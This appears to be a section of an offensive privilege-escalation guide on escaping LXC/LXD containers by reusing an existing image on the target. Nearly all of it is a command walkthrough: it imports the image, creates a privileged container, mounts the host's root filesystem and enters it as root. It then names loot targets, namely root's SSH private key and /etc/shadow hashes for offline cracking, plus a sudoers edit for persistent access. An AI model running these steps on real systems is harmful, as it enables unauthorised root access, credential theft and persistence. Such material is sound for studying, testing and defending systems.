## LXC / LXD — Container Escape (Existing Image)

**LXC** (Linux Containers) provides OS-level virtualization — multiple isolated Linux systems sharing the same host kernel. **LXD** extends this concept to full system containers, designed to run a complete OS rather than a single application.

To abuse either, group membership is required:

```shell
id
# Look for: lxc or lxd in the output
```

Two paths are available: build and transfer a custom container, or locate an existing image on the target system directly.

---

### Check for existing container images

```shell
ls ContainerImages/
```

Pre-built images may be misconfigured — no root password, no hardening, ready to mount.

---

### Import and prepare the image

```shell
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```

---

### Initialize a privileged container

The `security.privileged=true` flag disables all namespace isolation — the container runs without any separation from the host:

```shell
lxc init ubuntutemp privesc -c security.privileged=true
```

---

### Mount the host filesystem

```shell
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

---

### Start and enter the container

```shell
lxc start privesc
lxc exec privesc /bin/bash
```

---

### Browse the host filesystem as root

```shell
ls -l /mnt/root
```

From here the entire host filesystem is accessible. Priority targets:

- `/mnt/root/root/.ssh/id_rsa` — root SSH private key
- `/mnt/root/etc/shadow` — password hashes for offline cracking
- `/mnt/root/etc/sudoers` — add a persistent privilege entry

> 💡 The difference between this technique and the Alpine-based approach covered earlier is the starting point — here we reuse an image already present on the target, skipping the transfer step entirely.
